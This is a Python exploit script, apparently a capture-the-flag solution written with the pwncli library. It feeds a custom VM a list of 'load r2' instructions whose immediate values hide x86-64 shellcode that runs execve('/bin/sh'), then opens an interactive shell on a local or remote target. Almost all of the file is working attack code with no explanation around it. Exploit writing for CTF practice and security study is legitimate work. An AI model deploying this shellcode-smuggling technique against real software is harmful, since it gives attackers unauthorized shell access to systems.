#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

data = f'''
load r2, 0x686a90909090
load r2, 0x732f2f2f6e69622fb84890909090
load r2, 0x5090909090
load r2, 0xe7894890909090
load r2, 0x010169726890909090
load r2, 0x0101010124348190909090
load r2, 0xf63190909090
load r2, 0x5690909090
load r2, 0x086a90909090
load r2, 0x5e90909090
load r2, 0xe6014890909090
load r2, 0x5690909090
load r2, 0xe6894890909090
load r2, 0xd23190909090
load r2, 0x3b6a90909090
load r2, 0x5890909090
load r2, 0x050f90909090
'''
data = data.split("\n")
code = []
for i in data:
    if i != "":
        code.append(i.encode())

line_count = len(code)
lg("line_count")

ru(b'Please enter the number of lines you want to enter: ')
sl(i2b(line_count))

for i in range(line_count):
    ru(b'> ')
    sl(code[i])

ia()
